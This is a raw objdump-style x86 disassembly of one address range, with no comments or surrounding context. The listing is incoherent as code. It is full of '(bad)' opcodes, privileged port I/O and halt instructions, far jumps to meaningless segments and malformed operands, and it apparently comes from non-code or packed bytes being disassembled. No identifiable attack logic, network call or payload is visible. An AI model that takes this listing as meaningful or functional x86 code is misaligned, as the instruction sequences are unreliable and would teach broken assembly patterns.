  40f1dd:	fcmovnu st,st(1)
  40f1df:	mov    edi,0x4b70c0f3
  40f1e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1e5:	xchg   ecx,ebp
  40f1e7:	xlat   BYTE PTR ds:[ebx]
  40f1e8:	mov    ebp,0xbb3d57d9
  40f1ed:	pop    edx
  40f1ee:	pop    ebp
  40f1ef:	in     al,0xe6
  40f1f1:	mov    ch,0xe6
  40f1f3:	ret    
  40f1f4:	mov    dh,0x28
  40f1f6:	iret   
  40f1f7:	ins    DWORD PTR es:[edi],dx
  40f1f8:	cmc    
  40f1f9:	and    DWORD PTR [esi+edx*2-0x27d8be55],esp
  40f200:	lahf   
  40f201:	pop    esi
  40f202:	call   0x3cb39847
  40f207:	or     ah,BYTE PTR [eax]
  40f209:	cmp    bh,BYTE PTR [edx+0x77]
  40f20c:	out    dx,eax
  40f20d:	scas   al,BYTE PTR es:[edi]
  40f20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20f:	test   ah,ah
  40f211:	add    al,0x35
  40f213:	pop    ebp
  40f214:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40f216:	fdiv   DWORD PTR [edx+0x67]
  40f219:	loopne 0x40f1be
  40f21b:	sbb    al,0xd8
  40f21d:	iret   
  40f21e:	in     eax,0x45
  40f220:	ret    0x5d26
  40f223:	inc    ebx
  40f224:	mov    ds:0xac03fd48,eax
  40f229:	repz and cl,BYTE PTR [edi+ebx*8-0x2d]
  40f22e:	mov    esi,eax
  40f230:	sub    esi,DWORD PTR [esi]
  40f232:	cmc    
  40f233:	lds    ebp,FWORD PTR ds:0xfc484176
  40f239:	sbb    eax,0xac3fdc46
  40f23e:	fcomp  DWORD PTR [edi+0x42]
  40f241:	out    0x39,al
  40f243:	out    dx,al
  40f244:	xchg   edi,eax
  40f245:	ret    0x7d77
  40f248:	ja     0x40f1e8
  40f24a:	pop    edi
  40f24b:	xchg   edi,eax
  40f24c:	out    0xd1,eax
  40f24e:	bnd jb 0x40f238
  40f251:	sub    DWORD PTR [ebp-0x18],ecx
  40f254:	mov    ch,0x29
  40f256:	int3   
  40f257:	add    BYTE PTR [edx+0x21],0x3a
  40f25b:	lea    edi,[ebp+0x76]
  40f25e:	jle    0x40f245
  40f260:	and    eax,DWORD PTR [eax+edx*1-0x2f]
  40f264:	fisubr DWORD PTR [edx]
  40f266:	pop    ss
  40f267:	call   0x6d59:0xb53e0700
  40f26e:	ret    
  40f26f:	pop    esi
  40f270:	mov    ecx,0x6756d69d
  40f275:	mov    ah,0x80
  40f277:	xchg   ebx,eax
  40f278:	add    esp,edx
  40f27a:	loope  0x40f27d
  40f27c:	push   eax
  40f27d:	mov    esi,0x55e47e82
  40f282:	xchg   edx,eax
  40f283:	lock xchg esi,eax
  40f285:	lods   al,BYTE PTR ds:[esi]
  40f286:	and    BYTE PTR [ecx-0x34],cl
  40f289:	mov    dh,0x3a
  40f28b:	outs   dx,DWORD PTR ds:[esi]
  40f28c:	and    al,BYTE PTR [esi+edi*1+0x1a7ca83]
  40f293:	or     eax,0x914abecb
  40f298:	(bad)  
  40f299:	jp     0x40f25e
  40f29b:	xor    eax,0x48bb6ada
  40f2a0:	xchg   ecx,eax
  40f2a1:	cdq    
  40f2a2:	xchg   edx,eax
  40f2a3:	xchg   edx,eax
  40f2a4:	mov    esp,0xff510ef0
  40f2a9:	push   ebp
  40f2aa:	fld    QWORD PTR [eax-0x50]
  40f2ad:	fnstcw WORD PTR [ecx]
  40f2af:	in     al,dx
  40f2b0:	popa   
  40f2b1:	pop    ds
  40f2b2:	cs xchg edi,eax
  40f2b4:	test   eax,0xa27ee920
  40f2b9:	mov    ?,ebx
  40f2bb:	fcomp  DWORD PTR [ecx+0x2d]
  40f2be:	aaa    
  40f2bf:	mov    edi,0xd8b7ce88
  40f2c4:	push   eax
  40f2c5:	push   0x31ee2b42
  40f2ca:	fistp  DWORD PTR [edx+0x1d11fe30]
  40f2d0:	push   0xafe2a939
  40f2d5:	es cmp eax,0xa8d04486
  40f2db:	pop    ds
  40f2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2dd:	xchg   ch,bh
  40f2df:	adc    eax,DWORD PTR [ebp+0x45]
  40f2e2:	add    eax,0xa3fa40f0
  40f2e7:	xchg   ecx,eax
  40f2e8:	fstp   st(0)
  40f2ea:	sub    eax,0xd396704e
  40f2ef:	sar    BYTE PTR [edi+0x7f],0x17
  40f2f3:	sahf   
  40f2f4:	or     BYTE PTR [ecx+0x36],0x47
  40f2f8:	inc    edi
  40f2f9:	into   
  40f2fa:	xchg   esp,eax
  40f2fb:	or     esi,DWORD PTR [ecx+0x14]
  40f2fe:	out    0xac,eax
  40f300:	shr    DWORD PTR [ecx+0x7237935f],0xc7
  40f307:	in     eax,dx
  40f308:	(bad)  
  40f309:	xchg   ecx,eax
  40f30a:	retf   
  40f30b:	push   ss
  40f30c:	je     0x40f2cc
  40f30e:	ret    0x99cd
  40f311:	mov    esp,0x83165ed6
  40f316:	add    DWORD PTR [edi+0x650edfb7],0xffffff8f
  40f31d:	mov    ah,0xe1
  40f31f:	mov    ds:0x51471631,eax
  40f324:	stc    
  40f325:	mov    eax,ebp
  40f327:	(bad)  
  40f328:	xchg   ebp,eax
  40f329:	sbb    edx,ecx
  40f32b:	(bad)  
  40f32d:	xchg   ebp,esi
  40f32f:	sub    ebx,0xffffffb7
  40f332:	adc    ch,al
  40f334:	fs push 0xffffff94
  40f337:	mov    ebp,DWORD PTR [esi-0x40b92cb2]
  40f33d:	fwait
  40f33e:	sub    esi,esi
  40f340:	lea    ecx,[ecx+ecx*2+0x733bcc3e]
  40f347:	jecxz  0x40f2e4
  40f349:	mov    edi,0xdfe07a7a
  40f34e:	cs (bad) 
  40f350:	sub    dh,BYTE PTR [ebp+0x65]
  40f353:	inc    esp
  40f354:	xchg   ebp,eax
  40f355:	mov    ebp,0xe523c7f3
  40f35a:	and    al,0x8
  40f35c:	or     BYTE PTR [ebx-0x63],ch
  40f35f:	loopne 0x40f382
  40f361:	daa    
  40f362:	mov    ?,WORD PTR [esi+0x5b332d1c]
  40f368:	lods   eax,DWORD PTR ds:[esi]
  40f369:	cwde   
  40f36a:	pusha  
  40f36b:	(bad)  
  40f36c:	mov    edx,0x1a1ab113
  40f371:	fwait
  40f372:	daa    
  40f373:	je     0x40f36c
  40f375:	xchg   ecx,eax
  40f376:	or     edi,ebp
  40f378:	into   
  40f379:	icebp  
  40f37a:	adc    dl,ch
  40f37c:	sub    al,BYTE PTR [ebp-0x35083c40]
  40f382:	adc    edx,ecx
  40f384:	ins    DWORD PTR es:[edi],dx
  40f385:	int3   
  40f386:	or     DWORD PTR es:[esi],edx
  40f389:	aas    
  40f38a:	test   al,0x8c
  40f38c:	cmovbe ecx,DWORD PTR [edx+0x24]
  40f390:	retf   
  40f391:	(bad)  
  40f392:	pop    edi
  40f393:	cld    
  40f394:	retf   0xb38e
  40f397:	or     edx,DWORD PTR [edx]
  40f399:	dec    edx
  40f39a:	lahf   
  40f39b:	addr16 jb 0x40f3be
  40f39e:	cmp    DWORD PTR [ebp+0x54],edi
  40f3a1:	in     eax,dx
  40f3a2:	mov    esi,0x73605ee1
  40f3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3a8:	shr    BYTE PTR [ebx+eiz*8-0x7e],0x21
  40f3ad:	in     al,0x66
  40f3af:	shl    BYTE PTR [eax],0x63
  40f3b2:	mov    bh,0x57
  40f3b4:	lods   eax,DWORD PTR ds:[esi]
  40f3b5:	div    DWORD PTR [ecx+0x4d3ab421]
  40f3bb:	dec    esp
  40f3bc:	sbb    ah,BYTE PTR [ebp-0x738beec0]
  40f3c2:	add    BYTE PTR [ecx+0x3c],al
  40f3c5:	mov    ah,0x98
  40f3c7:	mov    bh,0x39
  40f3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ca:	cmc    
  40f3cb:	scas   eax,DWORD PTR es:[edi]
  40f3cc:	loop   0x40f3e0
  40f3ce:	sbb    esp,DWORD PTR [esi+0x4dcf361e]
  40f3d4:	dec    esi
  40f3d5:	xor    DWORD PTR [ecx-0x1b1e5117],0xcd68f37c
  40f3df:	mov    DWORD PTR [edi],esi
  40f3e1:	(bad)  
  40f3e3:	mov    bl,0x5
  40f3e5:	in     eax,0x71
  40f3e7:	and    esi,esi
  40f3e9:	cmp    al,0x15
  40f3eb:	cmc    
  40f3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ed:	and    DWORD PTR [edi-0x4c926c14],0x28204055
  40f3f7:	std    
  40f3f8:	(bad)  
  40f3f9:	adc    BYTE PTR [edx-0x39],dl
  40f3fc:	jecxz  0x40f3f3
  40f3fe:	sbb    esi,ecx
  40f400:	ins    BYTE PTR es:[edi],dx
  40f401:	inc    ebx
  40f402:	jge    0x40f3b4
  40f404:	leave  
  40f405:	fist   DWORD PTR [ebp+0x3]
  40f408:	add    eax,0x80567689
  40f40d:	in     al,dx
  40f40e:	adc    ch,BYTE PTR [ecx+edx*8]
  40f411:	mov    edx,DWORD PTR [edi]
  40f413:	sbb    BYTE PTR [edi-0x3337aa17],bl
  40f419:	xchg   ebx,eax
  40f41a:	dec    ebp
  40f41b:	js     0x40f3b2
  40f41d:	mov    edx,0x2a886861
  40f422:	inc    eax
  40f423:	(bad)  
  40f424:	adc    BYTE PTR [edx-0x725e7069],bl
  40f42a:	xchg   ebp,eax
  40f42b:	clc    
  40f42c:	dec    ecx
  40f42d:	imul   esi,DWORD PTR [ecx-0x26667989],0x72
  40f434:	loop   0x40f477
  40f436:	cmc    
  40f437:	mov    WORD PTR [ecx+0x626825db],gs
  40f43d:	xor    DWORD PTR [eax-0x9],0x34cf603a
  40f444:	mov    ds:0x3b5da826,eax
  40f449:	and    al,0x37
  40f44b:	jb     0x40f4ba
  40f44d:	mov    ecx,0xc7d677ca
  40f452:	push   es
  40f453:	stos   BYTE PTR es:[edi],al
  40f454:	retf   0x6443
  40f457:	cmp    ebp,DWORD PTR [ecx*8-0x31ec0190]
  40f45e:	mov    ds:0x1eceb9b6,al
  40f463:	packssdw mm3,QWORD PTR [edi+esi*1-0x43ed8be1]
  40f46b:	xchg   ecx,eax
  40f46c:	xchg   esi,eax
  40f46d:	mov    ebp,0x202b13e2
  40f472:	jp     0x40f3f7
  40f474:	jp     0x40f4c1
  40f476:	xchg   edi,eax
  40f477:	mov    eax,ds:0x35418093
  40f47c:	and    ebp,edi
  40f47e:	icebp  
  40f47f:	add    al,0xa6
  40f481:	les    edx,FWORD PTR [eax-0x450fe306]
  40f487:	jl     0x40f41f
  40f489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f48a:	dec    esp
  40f48b:	or     DWORD PTR [ebp+0x3e56324],edi
  40f491:	aad    0xcb
  40f493:	sbb    edi,DWORD PTR [ebx-0x7c]
  40f496:	scas   al,BYTE PTR es:[edi]
  40f497:	push   edi
  40f498:	mov    ebx,0x28969214
  40f49d:	or     DWORD PTR [esi],esp
  40f49f:	inc    edx
  40f4a0:	in     eax,0x3a
  40f4a2:	mov    bl,0x3d
  40f4a4:	jb     0x40f431
  40f4a6:	or     dh,cl
  40f4a8:	pop    ecx
  40f4a9:	das    
  40f4aa:	sbb    ebx,0x48bfd68a
  40f4b0:	(bad)  
  40f4b1:	mov    esp,0x898f9955
  40f4b6:	xchg   ebp,edx
  40f4b8:	push   eax
  40f4b9:	cld    
  40f4ba:	xchg   DWORD PTR [edx],edi
  40f4bc:	jne    0x40f4da
  40f4be:	dec    esp
  40f4bf:	call   0x81bc:0x2c6dd657
  40f4c6:	sbb    dh,BYTE PTR [edx-0x7162af61]
  40f4cc:	mov    eax,0x731b1e90
  40f4d1:	pop    esp
  40f4d2:	rol    BYTE PTR [ebp-0x2e99b84a],0xbc
  40f4d9:	test   BYTE PTR fs:[ebx-0x58],cl
  40f4dd:	jo     0x40f4be
  40f4df:	inc    edi
  40f4e0:	fwait
  40f4e1:	nop    DWORD PTR [esi+edx*2]
  40f4e5:	aaa    
  40f4e6:	loop   0x40f531
  40f4e8:	fs xor dl,cl
  40f4eb:	dec    esi
  40f4ec:	loopne 0x40f4b3
  40f4ee:	mov    dh,0x9e
  40f4f0:	sub    BYTE PTR [ebx-0x3d],dl
  40f4f3:	mov    eax,0x6d146c19
  40f4f8:	out    dx,al
  40f4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4fa:	push   ecx
  40f4fb:	inc    ebx
  40f4fc:	mov    ds:0xa180426,al
  40f501:	cwde   
  40f502:	push   edi
  40f503:	lods   al,BYTE PTR ds:[esi]
  40f504:	cmp    DWORD PTR [edi+0x78707266],edi
  40f50a:	gs enter 0x705e,0x93
  40f50f:	hlt    
  40f510:	div    al
  40f512:	jge    0x40f551
  40f514:	add    edx,esi
  40f516:	jge    0x40f49d
  40f518:	cld    
  40f519:	in     eax,0x5f
  40f51b:	out    0x60,eax
  40f51d:	push   ebx
  40f51e:	js     0x40f526
  40f520:	(bad)  
  40f521:	sub    esp,DWORD PTR [ecx+ecx*8-0x5fe6cf6f]
  40f528:	in     al,0x52
  40f52a:	retf   0x630e
  40f52d:	jno    0x40f520
  40f52f:	(bad)  
  40f530:	mov    bl,0xa1
  40f532:	push   esi
  40f533:	pop    es
  40f534:	mov    cl,0xad
  40f536:	arpl   WORD PTR [ecx-0x6d],di
  40f539:	xchg   BYTE PTR [ebp-0x27],bl
  40f53c:	sub    al,0xe1
  40f53e:	call   0x91a9:0xd008b629
  40f545:	add    BYTE PTR [edi-0x2b],bl
  40f548:	mov    cl,0x13
  40f54a:	cmp    BYTE PTR [ecx-0x28851984],bl
  40f550:	mov    ecx,0x2a9b10ca
  40f555:	add    eax,0x65c2c420
  40f55a:	in     al,0x10
  40f55c:	imul   ebx,DWORD PTR ds:0x858b0d94,0xb8689325
  40f566:	fwait
  40f567:	pop    esp
  40f568:	mov    al,0xca
  40f56a:	je     0x40f5dc
  40f56c:	inc    BYTE PTR [edi]
  40f56e:	xor    BYTE PTR [edx],dl
  40f570:	jmp    0x91d3:0x52b88f4c
  40f577:	ins    DWORD PTR es:[edi],dx
  40f578:	repnz sbb bh,BYTE PTR [ebx]
  40f57b:	jp     0x40f534
  40f57d:	add    al,0x80
  40f57f:	fwait
  40f580:	(bad)  
  40f581:	out    dx,al
  40f582:	add    al,BYTE PTR [esi-0x636f5f87]
  40f588:	fdiv   QWORD PTR [eax]
  40f58a:	jg     0x40f538
  40f58c:	xor    eax,0x82186ec4
  40f591:	(bad)  
  40f592:	push   edi
  40f593:	mov    edx,0xe5328763
  40f598:	push   ss
  40f599:	xchg   esi,eax
  40f59a:	xchg   esi,eax
  40f59b:	fxch   st(4)
  40f59d:	retf   0xce17
  40f5a0:	enter  0x4013,0x18
  40f5a4:	push   DWORD PTR [edx+0x1e]
  40f5a7:	mov    eax,0x45faf0e
  40f5ac:	sub    edi,DWORD PTR [ebp-0x620b9c58]
  40f5b2:	jge    0x40f5a5
  40f5b4:	in     eax,dx
  40f5b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5b6:	pop    es
  40f5b7:	dec    edx
  40f5b8:	cmc    
  40f5b9:	adc    DWORD PTR [ebx+0x7d],esp
  40f5bc:	out    dx,eax
  40f5bd:	aas    
  40f5be:	jle    0x40f5f1
  40f5c0:	push   cs
  40f5c1:	add    eax,0x96b1910e
  40f5c6:	es dec ecx
  40f5c8:	adc    ah,BYTE PTR [ebx+0x6951489d]
  40f5ce:	inc    ebx
  40f5cf:	xchg   ecx,eax
  40f5d0:	icebp  
  40f5d1:	in     al,0x30
  40f5d3:	inc    ebp
  40f5d4:	mov    al,0xb5
  40f5d6:	jl     0x40f55a
  40f5d8:	or     esp,0xffffffd0
  40f5db:	pushf  
  40f5dc:	imul   edi,DWORD PTR [ecx+0x6],0x3f
  40f5e0:	outs   dx,DWORD PTR ds:[esi]
  40f5e1:	jns    0x40f5b5
  40f5e3:	je     0x40f594
  40f5e5:	int    0xad
  40f5e7:	mov    dl,0x8d
  40f5e9:	imul   esi,DWORD PTR [esi-0x6d],0xffffffab
  40f5ed:	jmp    0x4391:0xf2d1402a
  40f5f4:	in     al,dx
  40f5f5:	ficomp DWORD PTR [ebp+0x68]
  40f5f8:	repnz ror BYTE PTR [eax-0x3c5edb7d],1
  40f5ff:	in     al,dx
  40f600:	aas    
  40f601:	iret   
  40f602:	jle    0x40f676
  40f604:	in     al,dx
  40f605:	mov    eax,ds:0x9377756a
  40f60a:	jno    0x40f60d
  40f60c:	jne    0x40f5f1
  40f60e:	pop    edi
  40f60f:	push   ds
  40f610:	pop    DWORD PTR [esi-0x7ee5225b]
  40f616:	pusha  
  40f617:	fdivr  QWORD PTR [edi-0x6bdd1fe1]
  40f61d:	and    dl,BYTE PTR [esp+ecx*8+0x3]
  40f621:	jns    0x40f666
  40f623:	push   ebp
  40f624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f625:	aam    0x49
  40f627:	dec    edi
  40f628:	inc    eax
  40f629:	adc    bh,BYTE PTR [edx]
  40f62b:	repz pop eax
  40f62d:	shl    DWORD PTR [ebx-0x72cccfb2],0x68
  40f634:	gs pop esi
  40f636:	(bad)  
  40f637:	ror    BYTE PTR [esp+eax*1-0x488f83fc],1
  40f63e:	mov    bl,0x14
  40f640:	sub    al,0x49
  40f642:	push   es
  40f643:	xor    BYTE PTR [edi-0x49],ah
  40f646:	repz pop esp
  40f648:	cmc    
  40f649:	lods   eax,DWORD PTR ds:[esi]
  40f64a:	cmp    BYTE PTR [ecx+esi*8+0x46],ah
  40f64e:	je     0x40f621
  40f650:	jnp    0x40f6a4
  40f652:	or     BYTE PTR [edi],bh
  40f654:	push   ebp
  40f655:	mov    edx,eax
  40f657:	in     al,0x55
  40f659:	mov    ds,esi
  40f65b:	push   esi
  40f65c:	imul   ebp,DWORD PTR [ecx-0x13b4f2ce],0xc894f6c
  40f666:	(bad)  
  40f667:	fmul   QWORD PTR ds:0xe02bad7
  40f66d:	cmp    edi,edx
  40f66f:	adc    DWORD PTR [ebp+0x4d605fd1],esi
  40f675:	call   DWORD PTR [edx+0xfc6b303]
  40f67b:	out    dx,eax
  40f67c:	and    DWORD PTR [edx+0x57],edx
  40f67f:	inc    ebx
  40f680:	mov    ecx,0x481c7944
  40f685:	adc    al,0x15
  40f687:	arpl   WORD PTR [ebp+0x409dbe1b],si
  40f68d:	ins    DWORD PTR es:[edi],dx
  40f68e:	les    esi,FWORD PTR [edi]
  40f690:	enter  0x18f3,0xea
  40f694:	sti    
  40f695:	popf   
  40f696:	jb     0x40f686
  40f698:	or     bh,BYTE PTR [edx]
  40f69a:	xchg   edi,eax
  40f69b:	dec    edi
  40f69c:	lock aas 
  40f69e:	adc    DWORD PTR [ebx-0x26c5482d],esi
  40f6a4:	call   0x2455:0xed642428
  40f6ab:	dec    BYTE PTR ds:0x5f529aa0
  40f6b1:	leave  
  40f6b2:	fisub  DWORD PTR [ebx-0xe]
  40f6b5:	fld    QWORD PTR [edi+0x75]
  40f6b8:	push   esp
  40f6b9:	xor    eax,DWORD PTR [edx+0x68]
  40f6bc:	sub    bh,BYTE PTR [ebx+esi*4+0x60]
  40f6c0:	inc    ebp
  40f6c1:	shl    DWORD PTR [ebp+0x61292db3],cl
  40f6c7:	push   ecx
  40f6c8:	arpl   sp,di
  40f6ca:	enter  0x7725,0xd
  40f6ce:	jg     0x40f680
  40f6d0:	cmp    BYTE PTR [esi-0x8],cl
  40f6d3:	gs sahf 
  40f6d5:	(bad)  
  40f6d6:	je     0x40f65e
  40f6d8:	cld    
  40f6d9:	dec    ebp
  40f6da:	fisubr WORD PTR [ebp+0xad70709]
  40f6e0:	test   eax,ebp
  40f6e2:	sbb    BYTE PTR [ecx+0x4c8543b4],al
  40f6e8:	push   esp
  40f6e9:	xor    DWORD PTR es:[eax],0xdad8117e
  40f6f0:	push   ds
  40f6f1:	pop    ebp
  40f6f2:	lods   eax,DWORD PTR ds:[esi]
  40f6f3:	or     eax,0x7760b837
  40f6f8:	in     eax,dx
  40f6f9:	mov    dl,0xbf
  40f6fb:	sahf   
  40f6fc:	cli    
  40f6fd:	or     DWORD PTR [edi],ecx
  40f6ff:	int    0x7c
  40f701:	xchg   dh,ah
  40f703:	push   ss
  40f704:	mov    esi,0xf188a4f1
  40f709:	adc    esi,DWORD PTR [ebx+0x63]
  40f70c:	adc    DWORD PTR [ebp+0x70],ecx
  40f70f:	jp     0x40f745
  40f711:	jg     0x40f790
  40f713:	and    al,dh
  40f715:	push   edi
  40f716:	ss hlt 
  40f718:	xchg   ebx,eax
  40f719:	xchg   ebx,eax
  40f71a:	or     bl,BYTE PTR [edi-0x141a48f5]
  40f720:	aad    0x30
  40f722:	push   cs
  40f723:	sub    ebp,eax
  40f725:	cmc    
  40f726:	iret   
  40f727:	pushf  
  40f728:	mov    eax,0x51d4fe15
  40f72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f72e:	into   
  40f72f:	je     0x40f6df
  40f731:	and    eax,0x53bfea50
  40f736:	fwait
  40f737:	out    0x99,al
  40f739:	inc    esp
  40f73a:	(bad)  
  40f73c:	fild   WORD PTR [edi-0x32c7783a]
  40f742:	cmc    
  40f743:	xor    edx,DWORD PTR [ecx+0x3b]
  40f746:	bound  eax,QWORD PTR [edx+0x4a]
  40f749:	fcom   QWORD PTR [ebp+0x2a158a66]
  40f74f:	cmp    dh,dh
  40f751:	rol    DWORD PTR [ebx],cl
  40f753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f754:	cmp    esp,ebx
  40f756:	add    esi,DWORD PTR [eax-0x8a44cce]
  40f75c:	clc    
  40f75d:	xchg   esi,eax
  40f75e:	mov    al,BYTE PTR [esi+0x2e8857e9]
  40f764:	pop    esp
  40f765:	jmp    0x92be7160
  40f76a:	jns    0x40f727
  40f76c:	cmp    al,0x9e
  40f76e:	push   es
  40f76f:	sbb    bh,BYTE PTR [eax]
  40f771:	outs   dx,BYTE PTR ds:[esi]
  40f772:	jno    0x40f755
  40f774:	shl    ebp,0xe3
  40f777:	sbb    bh,bl
  40f779:	pop    ebp
  40f77a:	add    DWORD PTR [edx],eax
  40f77c:	loop   0x40f766
  40f77e:	ror    bl,cl
  40f780:	je     0x40f797
  40f782:	retf   0xe65b
  40f785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f786:	push   es
  40f787:	std    
  40f788:	cmp    ch,BYTE PTR [ecx]
  40f78a:	ss gs pop ss
  40f78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f78e:	pop    ds
  40f78f:	mov    dl,0x30
  40f791:	addr16 jne 0x40f80d
  40f794:	push   edi
  40f795:	jo     0x40f7b3
  40f797:	xor    al,0xd0
  40f799:	push   ebp
  40f79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f79b:	xchg   DWORD PTR [eax],eax
  40f79d:	mov    dl,0x5c
  40f79f:	aaa    
  40f7a0:	fcomp  QWORD PTR [edx-0x50757bd7]
  40f7a6:	test   al,0xf4
  40f7a8:	sub    dh,dh
  40f7aa:	out    dx,al
  40f7ab:	call   0xc0e20b29
  40f7b0:	inc    ecx
  40f7b1:	lods   al,BYTE PTR ds:[esi]
  40f7b2:	pushf  
  40f7b3:	inc    ebp
  40f7b4:	ds push 0x5d3533b2
  40f7ba:	in     eax,0xdd
  40f7bc:	nop
  40f7bd:	in     eax,dx
  40f7be:	scas   al,BYTE PTR es:[edi]
  40f7bf:	mov    bh,0x49
  40f7c1:	xchg   ebx,eax
  40f7c2:	dec    ebx
  40f7c3:	jno    0x40f745
  40f7c5:	sub    BYTE PTR [esi+0x10],cl
  40f7c8:	adc    DWORD PTR [edx],ebp
  40f7ca:	cmp    DWORD PTR [edx],esi
  40f7cc:	add    al,0x42
  40f7ce:	sbb    eax,DWORD PTR [ecx+0x69]
  40f7d1:	xlat   BYTE PTR ds:[ebx]
  40f7d2:	je     0x40f847
  40f7d4:	sub    bl,dh
  40f7d6:	sbb    esp,DWORD PTR [edi+0x17a23461]
  40f7dc:	(bad)  
  40f7dd:	mov    edi,0x7a5e9394
  40f7e2:	shr    DWORD PTR [eax],0x42
  40f7e5:	gs push edi
  40f7e7:	pop    esi
  40f7e8:	fild   QWORD PTR [esi]
  40f7ea:	jle    0x40f7e7
  40f7ec:	std    
  40f7ed:	jp     0x40f7d8
  40f7ef:	leave  
  40f7f0:	outs   dx,BYTE PTR ds:[esi]
  40f7f1:	mov    al,0x27
  40f7f3:	(bad)  
  40f7f4:	jae    0x40f7c2
  40f7f6:	ror    DWORD PTR [eax-0xb],0x74
  40f7fa:	pop    ds
  40f7fb:	mov    dh,0xa5
  40f7fd:	arpl   WORD PTR [ebx-0x30],bp
  40f800:	shr    DWORD PTR [edx*2+0x3b32e2b1],0x87
  40f808:	jnp    0x40f829
  40f80a:	dec    ecx
  40f80b:	call   0x7427418d
  40f810:	aaa    
  40f811:	cdq    
  40f812:	cmp    BYTE PTR [esi-0x567ed20],ch
  40f818:	call   0x90503f
  40f81d:	xchg   BYTE PTR ds:0xc7bcf377,bl
  40f823:	push   cs
  40f824:	das    
  40f825:	aas    
  40f826:	cmp    esp,DWORD PTR [edi+0x72]
  40f829:	push   edx
  40f82a:	dec    esi
  40f82b:	icebp  
  40f82c:	ret    0x4e6f
  40f82f:	jecxz  0x40f873
  40f831:	mov    ds:0x1f112c8d,eax
  40f836:	push   ecx
  40f837:	sub    eax,0xfd2480f9
  40f83c:	aad    0x49
  40f83e:	sub    DWORD PTR ds:0x1cea339f,edx
  40f844:	add    DWORD PTR [edx],esp
  40f846:	out    dx,eax
  40f847:	mov    al,ds:0xab004c34
  40f84c:	inc    DWORD PTR [ebp+0x5cdf4ed9]
  40f852:	aad    0x7d
  40f854:	mov    ds:0xa431ff1,al
  40f859:	lahf   
  40f85a:	sbb    DWORD PTR [edi-0x15f8ae41],eax
  40f860:	stc    
  40f861:	sub    esi,edx
  40f863:	mov    bl,0xb1
  40f865:	pop    ebp
  40f866:	(bad)  
  40f867:	ficomp WORD PTR [edi]
  40f869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f86a:	pop    ecx
  40f86b:	sbb    BYTE PTR ds:0x8ebc7e24,ah
  40f871:	pop    esi
  40f872:	jb     0x40f84f
  40f874:	xchg   edi,eax
  40f875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f876:	jmp    0x40f866
  40f878:	call   0x7c61:0xbe4fb1bc
  40f87f:	cli    
  40f880:	pop    ebp
  40f881:	pop    es
  40f882:	fldenv [ecx-0x1127b991]
  40f888:	inc    edi
  40f889:	jae    0x40f86f
  40f88b:	pop    esp
  40f88c:	cmp    DWORD PTR [esi+0x32],edx
  40f88f:	mov    ds:0xa5e46ce0,eax
  40f894:	ret    0xab09
  40f897:	xor    al,0xbb
  40f899:	cmp    DWORD PTR [edi+edi*8+0x5aeaf23c],ebx
  40f8a0:	repz sbb cl,BYTE PTR [ecx+0x2f3e529a]
  40f8a7:	jno    0x40f872
  40f8a9:	pop    es
  40f8aa:	ret    0xef30
  40f8ad:	inc    eax
  40f8ae:	pop    ecx
  40f8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8b0:	jb     0x40f864
  40f8b2:	xchg   esp,eax
  40f8b3:	ja     0x40f8b5
  40f8b5:	ja     0x40f912
  40f8b7:	add    ch,BYTE PTR [ebx+esi*2+0x7e3a3a75]
  40f8be:	and    DWORD PTR [ecx],0x8fc8bd97
  40f8c4:	rol    DWORD PTR [edi],0x60
  40f8c7:	pop    ds
  40f8c8:	rsqrtps xmm7,XMMWORD PTR ds:0x1e9f32cf
  40f8cf:	pop    eax
  40f8d0:	cdq    
  40f8d1:	in     eax,0x2f
  40f8d3:	loopne 0x40f932
  40f8d5:	pop    esp
  40f8d6:	push   esi
  40f8d7:	in     al,dx
  40f8d8:	xor    edi,DWORD PTR ds:0x665f50d
  40f8de:	pop    esp
  40f8df:	rcl    DWORD PTR [ecx+ecx*1],0x10
  40f8e3:	mov    ebp,0xc2dddaa4
  40f8e8:	mov    WORD PTR [edx],ss
  40f8ea:	(bad)  
  40f8eb:	push   ecx
  40f8ec:	mov    ds:0x1185b200,eax
  40f8f1:	add    BYTE PTR [eax],dh
  40f8f3:	idiv   BYTE PTR [ecx+0xe422ac7]
  40f8f9:	xchg   edx,eax
  40f8fa:	mov    ds:0xa97ac634,al
  40f8ff:	or     BYTE PTR [ecx],bl
  40f901:	mov    esi,0x804cf82c
  40f906:	call   0x59a0f2dc
  40f90b:	jmp    0x40f92e
  40f90d:	push   ds
  40f90e:	xlat   BYTE PTR ds:[ebx]
  40f90f:	jecxz  0x40f939
  40f911:	int3   
  40f912:	cmp    eax,0x39293cc8
  40f917:	dec    ebx
  40f918:	cmp    dh,ch
  40f91a:	in     eax,dx
  40f91b:	inc    ebp
  40f91c:	add    DWORD PTR ds:0x3bc4ba1d,ebx
  40f922:	inc    edi
  40f923:	sti    
  40f924:	inc    ebx
  40f925:	retf   
  40f926:	ins    BYTE PTR es:[edi],dx
  40f927:	das    
  40f928:	(bad)
  40f92d:	mov    es,WORD PTR [esi]
  40f92f:	inc    ebx
  40f930:	jns    0x40f979
  40f932:	push   ecx
  40f933:	pop    edx
  40f934:	hlt    
  40f935:	std    
  40f936:	push   ebp
  40f937:	imul   esi,DWORD PTR [ecx-0x6a676c95],0x57820961
  40f941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f942:	mov    eax,0x941686b4
